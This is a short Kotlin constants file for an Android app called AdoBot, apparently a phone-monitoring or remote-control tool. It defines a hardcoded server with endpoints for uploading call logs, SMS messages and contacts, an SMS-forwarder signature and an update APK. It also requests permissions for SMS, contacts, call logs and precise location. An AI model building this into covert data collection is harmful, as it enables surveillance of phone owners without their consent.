package me.adobot

import android.Manifest

object Constants {

    val PACKAGE_NAME = "me.adobot"
    val UPDATE_PKG_FILE_NAME = "update.apk"
    val SMS_FORWARDER_SIGNATURE = "AdoBot SMS Forwarder"
    val PREF_SERVER_URL_FIELD = "serverUrl"
    val DEVELOPMENT_SERVER = "http://10.24.0.134:3000"
    val NOTIFY_URL = "/notify"
    val POST_CALL_LOGS_URL = "/call-logs"
    val POST_MESSAGE_URL = "/message"
    val POST_CONTACTS_URL = "/contacts"
    val POST_STATUS_URL = "/status"
    val TAG = "Suthar"

    const val server = "10.24.0.134"
    const val port = 3000


    val PERMISSIONS = arrayOf(Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE)

}